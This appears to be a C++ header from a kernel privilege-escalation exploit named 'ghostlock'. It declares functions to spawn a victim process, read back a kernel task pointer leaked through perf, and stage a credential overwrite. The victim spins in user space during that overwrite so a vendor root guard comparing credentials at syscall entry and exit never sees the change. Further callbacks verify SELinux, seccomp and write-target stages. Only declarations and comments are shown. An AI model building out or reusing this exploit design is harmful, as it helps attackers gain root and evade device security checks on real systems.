#ifndef GHOSTLOCK_VICTIM_PROCESS_HPP
#define GHOSTLOCK_VICTIM_PROCESS_HPP

#include "common.h"
#include "session/victim_context.hpp"

#include <optional>

namespace ghostlock::session::victim {
    /* Verification contexts handed to retry_write_stage callbacks. */
    struct w2_stage_context {
        VictimContext &pipes;
        /* Victim spin window (session/victim_spin.h): the victim busy-waits in
         * user space across the credential write so a vendor root guard that
         * compares credentials at syscall entry/exit never sees the change. */
        int32_t spin_armed = 0;
        int32_t victim_dead = 0;
        uint32_t spin_seq = 0;
    };

    /* Pre-write hook for the W2 credential stage: puts the victim into its
     * user-space spin and waits for it to report armed. Returns 1 when armed,
     * 0 when the spin could not be established (the blocked-read protocol then
     * applies). Body-free when the victim is gone. */
    int32_t arm_w2_spin(void *context);

    /* Release a spin the stage is giving up on. Idempotent. */
    void release_victim_spin(w2_stage_context &stage);

    struct w3_stage_context {
        VictimContext &pipes;
        int32_t leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
    };

    /* Fork the victim and read back the task pointer perf leaked. Returns
     * nullopt when the fork/pipe setup failed (retryable). */
    struct VictimSpawn {
        pid_t pid;
        uintptr_t task;
    };

    std::optional<VictimSpawn> spawn_victim(VictimContext &p);

    /* Stage verification callbacks. */
    int32_t verify_selinux_stage(void *context);

    int32_t verify_w2_stage(void *context);

    int32_t verify_seccomp_probe_stage(void *context);

    int32_t verify_leaf_dir_stage(void *context);
} // namespace ghostlock::session::victim

#endif
